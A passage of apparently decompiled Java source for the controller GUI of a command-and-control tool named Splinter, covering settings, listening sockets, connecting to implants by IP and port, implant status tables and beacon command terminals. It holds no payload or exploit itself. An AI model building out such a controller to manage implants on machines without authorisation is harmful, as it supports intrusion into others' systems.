      threadToDelete.killThread = true;

      return true;
    }
    catch (Exception e)
    {
      Drivers.eop("disconnectSelectedAgent.", "Splinter_GUI", e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public boolean setTextSize(int index)
  {
    try
    {
      if (index < 1) {
        return false;
      }
      Drivers.fontSize = Integer.parseInt((String)this.jcbFontSize.getSelectedItem());

      return true;
    }
    catch (Exception e)
    {
      Drivers.fontSize = 12;
      Drivers.eop("setFontSize", Splinter_GUI.class.getName(), e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public boolean setColorScheme(int index)
  {
    try
    {
      switch (index)
      {
      case 0:
        return true;
      case 1:
        Drivers.clrBackground = Color.black;

        Drivers.clrForeground = Color.red;
        Drivers.clrImplant = Color.green;

        Drivers.clrController = Color.white;

        break;
      case 2:
        Drivers.clrBackground = Color.white;

        Drivers.clrForeground = new Color(0, 51, 102);
        Drivers.clrImplant = new Color(0, 51, 102);

        Drivers.clrController = Color.black;

        break;
      case 3:
        Drivers.clrBackground = Color.black;

        Drivers.clrForeground = Color.green;
        Drivers.clrImplant = Color.white;

        Drivers.clrController = Color.yellow;

        break;
      case 4:
        Drivers.clrBackground = Color.white;

        Drivers.clrForeground = Color.black;
        Drivers.clrImplant = Color.black;

        Drivers.clrController = Color.blue;

        break;
      case 5:
        Drivers.clrBackground = Color.red.darker().darker();

        Drivers.clrForeground = Color.white;
        Drivers.clrImplant = Color.white;

        Drivers.clrController = Color.yellow;

        break;
      case 6:
        Drivers.clrBackground = Color.black;

        Drivers.clrForeground = Color.green;
        Drivers.clrImplant = Color.red;

        Drivers.clrController = Color.green;

        break;
      case 7:
        Drivers.clrBackground = Color.blue.darker();

        Drivers.clrForeground = Color.white;
        Drivers.clrImplant = Color.white;

        Drivers.clrController = Color.yellow;
      }

      try
      {
        Drivers.txtpne_broadcastMessageBoard.setBackground(Drivers.clrBackground);
        Drivers.jtxtpne_CnslOut.setBackground(Drivers.clrBackground);
        this.jpnlChatTerminal.txtpne_broadcastMessages.setBackground(Drivers.clrBackground);

        jpnlMainController.jpnlSend.setBackground(Drivers.clrController.darker());
        this.jpnlChatTerminal.jpnlSend.setBackground(Drivers.clrController.darker());

        Drivers.txtpne_broadcastMessageBoard.validate();
        Drivers.jtxtpne_CnslOut.validate();
        this.jpnlChatTerminal.txtpne_broadcastMessages.validate();
      }
      catch (Exception localException1)
      {
      }

      return true;
    }
    catch (Exception e)
    {
      Drivers.eop("setColorScheme", Splinter_GUI.class.getName(), e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  private boolean connectToImplant(boolean connectingToImplant, boolean connectingToController, boolean connectingToRelay, boolean connectToCortana)
  {
    try
    {
      String IP = this.jtfIP_Address_To_Implant.getText();

      if ((IP == null) || (IP.trim().equals("")))
      {
        Drivers.jop_Error("Invalid IP Address Entered", "Cannot Connect to Implant");
        return false;
      }

      if (IP.trim().equalsIgnoreCase("localhost"))
      {
        IP = "127.0.0.1";
      }

      int PORT = 80;
      try
      {
        PORT = Integer.parseInt(this.jtfPort_Address_To_Implant.getText());

        if ((PORT < 1) || (PORT > 65534))
          throw new Exception("Port out of range!");
      }
      catch (Exception e)
      {
        if (e.getLocalizedMessage().equals("Port out of range!")) {
          Drivers.jop_Error("Invalid PORT Entered - PORT OUT OF RANGE!!!", "Cannot Connect to Implant");
        }
        else {
          Drivers.jop_Error("Invalid PORT Entered", "Cannot Connect to Implant");
        }
        return false;
      }

      try
      {
        Socket sckClientSocket = new Socket(IP, PORT);

        Thread_Terminal terminal = new Thread_Terminal(connectingToImplant, connectingToController, connectingToRelay, sckClientSocket);
        terminal.start();

        Drivers.alTerminals.add(terminal);

        Drivers.updateConnectedImplants();
        Drivers.jtblConnectedImplants.updateJTable = true;
      }
      catch (Exception e)
      {
        Drivers.jop_Error("Unable to connect to client at " + IP + ":" + PORT, "Error Binding to Target");
        return false;
      }

      return true;
    }
    catch (Exception e)
    {
      Drivers.eop("connectToImplant", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  private boolean establishServerSocket()
  {
    try
    {
      int newPort = -1;
      try
      {
        newPort = Integer.parseInt(this.jtfServerSocketPort.getText().trim());
      }
      catch (Exception e)
      {
        Drivers.jop_Error("Invalid ServerSocket Port Number", "Unable to establish ServerSocket");
        return false;
      }

      if ((newPort < 1) || (newPort > 65534))
      {
        Drivers.sop("Seriously, you try to connect to a port that is out of range?  Tisk. * * shakes head * * Good try tho ;-)");
        Drivers.jop_Error("Unable to start ServerSocket.  Socket Port is out of range!!!", "Can not Start ServerSocket");
        return false;
      }

      if (thdServerSocket == null)
      {
        thdServerSocket = new Thread_ServerSocket(newPort, jlblServerSocketStatus, jlblEstablishedPort, jlblNumberConnectedImplants, jlblLHOST_ME_IP);
        thdServerSocket.start();
      }
      else if ((thdServerSocket != null) && (Thread_ServerSocket.serverSocketRunning))
      {
        if (Drivers.jop_Confirm("ServerSocket is already established on port: " + Thread_ServerSocket.svrSocketPort + ".\nDo you wish to close that port and re-establish the server on port " + newPort + "?", "Re-establish ServerSocket?") != 0)
        {
          return false;
        }

        Drivers.sop("User chose to continue.  Re-establishing ServerSocket on port " + newPort);
        try
        {
          Thread_ServerSocket.svrSocket.close(); } catch (Exception localException1) {
        }thdServerSocket = new Thread_ServerSocket(newPort, jlblServerSocketStatus, jlblEstablishedPort, jlblNumberConnectedImplants, jlblLHOST_ME_IP);
        thdServerSocket.start();
      }
      else if ((thdServerSocket != null) && (Drivers.jop_Confirm("An instance of the ServerSocket thread has been initialized. \nIt might not be running however.  \n\nDo you wish to re-initialize the ServerSocket", "Re-Initialize ServerSocket Thread") == 0))
      {
        Drivers.sop("User chose to continue.  Re-establishing ServerSocket on port " + newPort);
        try
        {
          Thread_ServerSocket.svrSocket.close(); } catch (Exception localException2) {
        }thdServerSocket = new Thread_ServerSocket(newPort, jlblServerSocketStatus, jlblEstablishedPort, jlblNumberConnectedImplants, jlblLHOST_ME_IP);
        thdServerSocket.start();
      }

      return true;
    }
    catch (Exception e)
    {
      Drivers.eop("establishServerSocket", this.strMyClassName, e, "", true);
    }

    return false;
  }

  public void initializeSettings()
  {
    try
    {
      Driver.controller_is_running = true;

      JLabel lblServerSocket = new JLabel("Server Socket:");
      lblServerSocket.setBounds(10, 35, 100, 14);

      this.jpnlServerSocket.add(this.jlblEstablishServerSocket);
      this.jpnlServerSocket.add(this.jtfServerSocketPort);
      this.jbtnEstablishServerSocket = new JButton("    Establish ServerSocket   ");

      this.jpnlServerSocket.add(this.jbtnEstablishServerSocket);

      this.jbtnCloseServerSocket = new JButton("      Close ServerSocket      ");

      this.jpnlServerSocket.add(this.jbtnCloseServerSocket);

      this.jpnlServerSocket.add(this.jcbEnableLogging);
      this.jcbEnableLogging.addActionListener(this);

      this.jpnlConnectToImplant.add(this.jlblConnectToImplant_IP);
      this.jpnlConnectToImplant.add(this.jtfIP_Address_To_Implant);
      this.jpnlConnectToImplant.add(this.jlblConnectToImplant_Port);
      this.jpnlConnectToImplant.add(this.jtfPort_Address_To_Implant);
      this.jbtnBindToImplant = new JButton("Bind to Implant");
      this.jbtnConnectToController = new JButton("Connect to Controller");
      this.jbtnBindToImplant.setToolTipText("Click to establish a TCP connection to the implant");
      this.jbtnConnectToController.setToolTipText("Use this option to connect to another controller for the Chat to work properly");
      this.jpnlConnectToImplant.add(this.jbtnBindToImplant);
      this.jpnlConnectToImplant.add(this.jbtnConnectToController);

      this.jcbBindingOption = new JComboBox(this.arrBindingOptions);
      this.jbtnBindToHost = new JButton("           Bind          ");

      this.jpnlConnectToImplant.add(this.jcbBindingOption);
      this.jpnlConnectToImplant.add(this.jbtnBindToHost);
      this.jbtnBindToHost.addActionListener(this);

      this.jbtnBindToImplant.addActionListener(this);
      this.jbtnConnectToController.addActionListener(this);

      this.jbtnEstablishServerSocket.addActionListener(this);

      this.jbtnCloseServerSocket.addActionListener(this);

      this.jbtnConnectToController.setVisible(false);
      this.jbtnBindToImplant.setVisible(false);
    }
    catch (Exception e)
    {
      Drivers.eop("initializeSettings", this.strMyClassName, e, "", true);
    }
  }

  public void initializeJTabbedPane()
  {
    try
    {
      this.tabbedPane_Main = new JTabbedPane(1);
      this.tabbedPane_Main.setBounds(10, 35, 1006, 520);

      this.tabbedPane_IMPLANTS = new JTabbedPane(2);

      initializeSettings();

      initializeConnectedAgentsColNames();

      this.jcbAppearance = new JComboBox();
      this.jcbAppearance.setModel(new DefaultComboBoxModel(new String[] { "Appearance", "1337", "Bwwwallllzzzz", "Solo", "Nick", "MullinsFTW", "Neo", "DOS" }));

      this.jcbFontSize = new JComboBox();
      this.jcbFontSize.setModel(new DefaultComboBoxModel(this.arrTextSizes));

      this.jpnlConnectionStatus.setBounds(10, 11, 984, 30);

      this.jpnlConnectionStatus.add(jlblServerSocketStatus_text);
      this.jpnlConnectionStatus.add(jlblServerSocketStatus);
      this.jpnlConnectionStatus.add(jlblEstablishedPort_text);
      this.jpnlConnectionStatus.add(jlblEstablishedPort);
      this.jpnlConnectionStatus.add(jlblNumberConnectedImplants_Text);
      this.jpnlConnectionStatus.add(jlblNumberConnectedImplants);

      this.jpnlConnectionStatus.add(jlblLHOST_ME_IP_Text);
      this.jpnlConnectionStatus.add(jlblLHOST_ME_IP);

      jlblServerSocketStatus.setOpaque(true);
      jlblEstablishedPort.setOpaque(true);
      jlblNumberConnectedImplants.setOpaque(true);
      jlblLHOST_ME_IP.setOpaque(true);

      Drivers.jlblNumImplantsConnected = jlblNumberConnectedImplants;

      this.jpnlNorth.add("North", this.jpnlConnectionStatus);

      JPanel jpnlTime = new JPanel();
      jpnlTime.add(this.jlblCurrentTime);
      jpnlTime.add(this.jlblZuluTime);

      this.jlblCurrentTime.setFont(new Font("Courier", 1, 20));
      this.jlblZuluTime.setFont(new Font("Courier", 1, 20));

      this.jpnlNorth.add("Center", jpnlTime);

      this.jpnlHeading.add("Center", this.jpnlNorth);
      getContentPane().add("North", this.jpnlHeading);

      getContentPane().add("South", this.jpnlSouth);

      this.jpnlHeapSize.add(this.jlblHeapSize_Current_Text); this.jpnlHeapSize.add(this.jlblHeapSize_Current);
      this.jpnlHeapSize.add(this.jlblHeapSize_Available_Text); this.jpnlHeapSize.add(this.jlblHeapSize_Available);
      this.jpnlHeapSize.add(this.jlblHeapSize_Max_Text); this.jpnlHeapSize.add(this.jlblHeapSize_Max);

      this.jpnlHeapSize.add(this.jcbAppearance);
      this.jpnlHeapSize.add(this.jcbFontSize);
      this.jpnlHeapSize.add(this.jbtnClearConsoleOut);
      this.jpnlHeapSize.add(this.jcbAutoScrollConsoleOut);

      this.jbtnClearConsoleOut.addActionListener(this);
      this.jcbAutoScrollConsoleOut.addActionListener(this);

      this.jpnlHeapSize_Alignment.add("East", this.jpnlHeapSize);
      this.jpnlHeapSize_Alignment.setBorder(new BevelBorder(1, null, null, null, null));

      this.jpnlSouth.add(this.jpnlHeapSize_Alignment);

      this.jlblHeapSize_Current.setForeground(Color.black);
      this.jlblHeapSize_Available.setForeground(Color.black);
      this.jlblHeapSize_Max.setForeground(Color.black);

      thdWorkerJLabels = new Thread_JLabels(this.jlblHeapSize_Current, this.jlblHeapSize_Available, this.jlblHeapSize_Max, this.jlblCurrentTime, this.jlblZuluTime);
      thdWorkerJLabels.start();

      this.jpnlServerSocketSettings_Title.setBorder(new TitledBorder(UIManager.getBorder("TitledBorder.border"), "Connection Settings", 4, 2, null, new Color(0, 51, 255)));

      this.jpnlConnectionStatus_1.add("West", this.jpnlServerSocket);
      this.jpnlConnectionStatus_2.add("West", this.jpnlConnectToImplant);

      this.jpnlConnectionStatus_1.setBorder(new BevelBorder(1, null, null, null, null));
      this.jpnlConnectionStatus_2.setBorder(new BevelBorder(1, null, null, null, null));
      this.jpnlConnectionStatus_3.setBorder(new BevelBorder(1, null, null, null, null));

      this.jpnlServerSocketSettings_Title.add(this.jpnlConnectionStatus_1);
      this.jpnlServerSocketSettings_Title.add(this.jpnlConnectionStatus_3);
      this.jpnlServerSocketSettings_Title.add(this.jpnlConnectionStatus_2);

      this.jpnlConnectionTab.add("North", this.jpnlServerSocketSettings_Title);

      jtblConnectedAgents = new JTable_Solomon(Drivers.vctJTableConnectedAgentsColNames, Drivers.vctJTableConnectedAgentsToolTips, "ACTIVE IMPLANTS", Color.blue.darker(), null);
      Drivers.jtblConnectedImplants = jtblConnectedAgents;
      this.jpnlJTable_Title.add("Center", jtblConnectedAgents);
      this.jpnlJTable_Title.setBorder(new TitledBorder(UIManager.getBorder("TitledBorder.border"), "Connected Implants", 4, 2, null, new Color(0, 51, 255)));

      jtblDisconnectedAgents = new JTable_Solomon(Drivers.vctJTableDISCONNECTED_AGENTS_ConnectedAgentsColNames, Drivers.vctJTableDISCONNECTED_AGENTS_ConnectedAgentsToolTips, "DISCONNECTED IMPLANTS", Color.RED.darker(), null);
      Drivers.jtblDisconnectedImplants = jtblDisconnectedAgents;
      this.jpnlJTable_DisconneectedImplants_Title.add("Center", jtblDisconnectedAgents);
      this.jpnlJTable_DisconneectedImplants_Title.setBorder(new TitledBorder(UIManager.getBorder("TitledBorder.border"), "Disconnected Implants", 4, 2, null, new Color(0, 51, 255)));

      jtblBeaconingAgents = new JTable_Solomon(Drivers.vctJTableBEACONING_AGENTS_ConnectedAgentsColNames, Drivers.vctJTableBEACONING_AGENTS_ConnectedAgentsToolTips, "BEACONING IMPLANTS", new Color(101, 45, 93), null);
      Drivers.jtblBeaconImplants = jtblBeaconingAgents;
      jtblBeaconingAgents.i_am_beacon_jtable = true;
      jtblBeaconingAgents.jbtnClear.setVisible(true);
      jtblBeaconingAgents.jbtnClear.addActionListener(this);
      this.jpnlJTable_BeaconingImplants_Title.add("Center", jtblBeaconingAgents);
      this.jpnlJTable_BeaconingImplants_Title.setBorder(new TitledBorder(UIManager.getBorder("TitledBorder.border"), "Beaconing Implants", 4, 2, null, new Color(0, 51, 255)));

      jtblLoggieAgents = new JTable_Solomon(Drivers.vctJTableConnectedAgentsColNames, Drivers.vctJTableConnectedAgentsToolTips, "LOGGING AGENTS", Color.green.darker().darker(), null);
      Drivers.jtblLoggingAgents = jtblLoggieAgents;
      jtblLoggieAgents.jbtnDisconnectImplant.setEnabled(false);
      jtblLoggieAgents.jbtnRefresh.setEnabled(false);
      jtblLoggieAgents.jbtnDisconnectImplant.setText("Disconnect Selected Agent");
      jtblLoggieAgents.i_am_loggie_jtable = true;
      jtblLoggieAgents.jbtnRefresh.setVisible(true);
      this.jpnlJTable_LoggingAgents_Title.add("Center", jtblLoggieAgents);
      this.jpnlJTable_LoggingAgents_Title.setBorder(new TitledBorder(UIManager.getBorder("TitledBorder.border"), "Logging Agents", 4, 2, null, new Color(0, 51, 255)));

      this.jpnlConsoleOut_Title.setBorder(new TitledBorder(UIManager.getBorder("TitledBorder.border"), "Console Out", 4, 2, null, new Color(0, 51, 255)));

      jtxtpne_ConsoleOut = new JPanel_TextDisplayPane();
      Drivers.jtxtpne_CnslOut = jtxtpne_ConsoleOut;
      Driver.jtxtpne_CnslOut = jtxtpne_ConsoleOut;
      this.jscrlPne_ConsoleOut = new JScrollPane(jtxtpne_ConsoleOut);

      this.jscrlPne_ConsoleOut.setPreferredSize(new Dimension(1, 90));

      this.jpnlConsoleOut_Title.add("Center", this.jscrlPne_ConsoleOut);

      this.tabbedPane_IMPLANTS.addTab("Active", this.jpnlJTable_Title);
      this.tabbedPane_IMPLANTS.addTab("Beaconing", this.jpnlJTable_BeaconingImplants_Title);
      this.tabbedPane_IMPLANTS.addTab("Logging", this.jpnlJTable_LoggingAgents_Title);
      this.tabbedPane_IMPLANTS.addTab("DISCONNECTED", this.jpnlJTable_DisconneectedImplants_Title);

      this.jpnlConnectionTab.add("Center", this.tabbedPane_IMPLANTS);
      this.jspltPne_Main = new JSplitPane(0, this.tabbedPane_Main, this.jpnlConsoleOut_Title);
      this.jspltPne_Main.setOneTouchExpandable(true);
      this.jspltPne_Main.setDividerLocation(460);
      getContentPane().add("Center", this.jspltPne_Main);

      this.tabbedPane_Main.addTab("   Connection Status   ", this.jpnlConnectionTab);
    }
    catch (Exception localException)
    {
    }
  }

  public boolean closeServerSocket()
  {
    try
    {
      if ((thdServerSocket != null) && (Thread_ServerSocket.svrSocket.isBound()))
      {
        if (Drivers.jop_Confirm("ServerSocket is currently open.  \nDo you wish to close the ServerSocket?", "Confirm close ServerSocket") != 0)
        {
          return false;
        }

      }
      else
      {
        Drivers.jop_Error("ServerSocket does not appear to be open", "Unable to Continue");

        return false;
      }

      Thread_ServerSocket.svrSocket.close();

      Thread_ServerSocket.keepServerSocketOpen = false;

      thdServerSocket = null;

      return true;
    }
    catch (Exception e)
    {
      Drivers.eop("closeServerSocket", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public void initializeControllerWindow()
  {
    try
    {
      jpnlMainController = new JPanel_MainControllerWindow(0, false, null);
      Drivers.txtpne_broadcastMessageBoard = jpnlMainController.txtpne_broadcastMessages;

      jpnlBeaconCommandsControllerWindow = new JPanel_MainControllerWindow(5, false, null);
      Drivers.txtpne_BEACON_broadcastMessageBoard = jpnlBeaconCommandsControllerWindow.txtpne_broadcastMessages;

      Drivers.dfltLstMdl_ConnectedImplants = jpnlMainController.dfltLstMdl_ConnectedClients;
      Drivers.jlstConnectedImplants = jpnlMainController.jlstConnectedClients;

      Drivers.dfltLstMdl_BeaconingImplants = jpnlBeaconCommandsControllerWindow.dfltLstMdl_ConnectedClients;
      Drivers.jlstBeaconImplants = jpnlMainController.jlstConnectedClients;

      this.jpnlChatTerminal = new JPanel_MainControllerWindow(2, false, null);
      Drivers.txtpne_mainChatBoard = this.jpnlChatTerminal.txtpne_broadcastMessages;

      Drivers.dfltLstMdl_ConnectedControllers = this.jpnlChatTerminal.dfltLstMdl_ConnectedClients;
      Drivers.jlstConnectedControllers = this.jpnlChatTerminal.jlstConnectedClients;
      this.jpnlChatTerminal.configureInterface_ChatClient();

      this.tabbedPane_Main.addTab("  Command Terminal  ", jpnlMainController);
      this.tabbedPane_Main.addTab("  Collaboration Chat  ", this.jpnlChatTerminal);

      Drivers.alBeaconCommands_GUI.add(this.beaconCommand);
      updateBeaconingCommandList_GUI();
      this.beaconCommand.jbtnAddBeaconCommand.addActionListener(this);
      this.beaconCommand.jbtnDeleteThisCommand.addActionListener(this);
      this.jscrlpneBeaconCommands = new JScrollPane(this.jpnlBeaconCommands);
      this.jspltpne_BeaconTerminal = new JSplitPane(0, this.jscrlpneBeaconCommands, jpnlBeaconCommandsControllerWindow);
      this.jspltpne_BeaconTerminal.setOneTouchExpandable(true);
      this.jspltpne_BeaconTerminal.setDividerLocation(50);
      this.tabbedPane_Main.addTab("  Beaconing Agents' Command Terminal  ", this.jspltpne_BeaconTerminal);
    }
    catch (Exception e)
    {
      Drivers.eop("initializeControllerWindow", this.strMyClassName, e, "", true);
    }
  }

  public void initializeConnectedAgentsColNames()
  {
    try
    {
      for (int i = 0; i < Drivers.jTableConnectedAgentsColNames.length; i++)
      {
        Drivers.vctJTableConnectedAgentsColNames.add(Drivers.jTableConnectedAgentsColNames[i]);
        Drivers.vctJTableConnectedAgentsToolTips.add(Drivers.arrJTableConnectedAgentsToolTips[i]);
      }

      for (int i = 0; i < Drivers.jTableDISCONNECTED_AGENTS_ConnectedAgentsColNames.length; i++)
      {
        Drivers.vctJTableDISCONNECTED_AGENTS_ConnectedAgentsColNames.add(Drivers.jTableDISCONNECTED_AGENTS_ConnectedAgentsColNames[i]);
        Drivers.vctJTableDISCONNECTED_AGENTS_ConnectedAgentsToolTips.add(Drivers.arrJTableDISCONNECTED_AGENTS_ConnectedAgentsToolTips[i]);
      }

      for (int i = 0; i < Drivers.arrJTableBEACONING_AGENTS_ConnectedAgentsColNames.length; i++)
      {
        Drivers.vctJTableBEACONING_AGENTS_ConnectedAgentsColNames.add(Drivers.arrJTableBEACONING_AGENTS_ConnectedAgentsColNames[i]);
        Drivers.vctJTableBEACONING_AGENTS_ConnectedAgentsToolTips.add(Drivers.arrJTableBEACONING_AGENTS_ConnectedAgentsToolTips[i]);
      }

    }
    catch (Exception e)
    {
      Drivers.eop("initializeConnectedAgentsColNames", this.strMyClassName, e, "", true);
    }
  }
}